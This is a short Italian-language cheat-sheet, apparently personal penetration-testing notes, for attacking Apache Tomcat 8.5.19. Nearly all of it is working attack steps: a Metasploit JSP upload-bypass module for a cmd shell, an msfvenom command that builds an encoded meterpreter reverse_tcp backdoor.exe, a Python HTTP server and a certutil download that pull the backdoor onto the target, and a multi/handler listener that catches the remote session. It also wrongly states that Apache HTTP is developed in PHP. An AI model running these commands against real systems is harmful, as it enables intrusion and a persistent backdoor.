**Apache Tomcat** è un **Java** server Web gratuito ed open source

È utilizzato per costruire e ospitare siti web dinamici e applicazioni web basate sulla piattaforma
software Java. (l server web standard **Apache HTTP** è tipicamente sviluppato in **PHP**).

- utilizza il **protocollo** **HTTP** per facilitare la comunicazione sottostante tra il server e i client.
- viene eseguito sulla porta TCP **8080** per impostazione predefinita.
- la versione vulnerabile è V8.5.19

EXPLOIT

SU METASPLOIT

1. `use exploit/multi/http/tomcat_jsp_upload_bypass` è un modulo automatico che crea una shell **cmd** sul server target

A QUESTO PUNTO POSSIAMO CARICARE SUL TARGET UNA SHELL METERPRETER CON MSFVENOM

1. **`msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx** -i 10 -e x86/shikata_ga_nai **-f exe > backdoor.exe`** Creiamo una shell 
2. **`python3 -m http.server PORTA`** apriamo un server per il trasferimento della shell

TORNIAMO SULLA SESSIONE DEL TARGET 

1. `certutil -urlcache -f http://MIO_IP/backdoor.exe RINOMINARE_FILE_CARICATO.EXE` 
    1. ES: certutil -urlcache -f http://MIO_IP/backdoor.exe backdoorsulpctarget.exe

APRIAMO UNA CONESSIONE HANDLER

1. **msfconsole`use exploit/multi/handler`** creato il payload e caricato sul target ci mettiamo in ascolto con la sessione meterpreter
2. **`set payload PAYLOAD_UTILZZATO_X_MSFVENOM`** mettiamo lo stesso payload ES: **windows/meterpreter/reverse_tcp**
    1. **LHOST** inserire l’ip in ascolto (mio IP)
    2. **LPORT** inserire posta in ascolto

AVVIAMO LA BACKDOOR.EXE DAL TARGET

1. `./backdoorsulpctarget.exe`
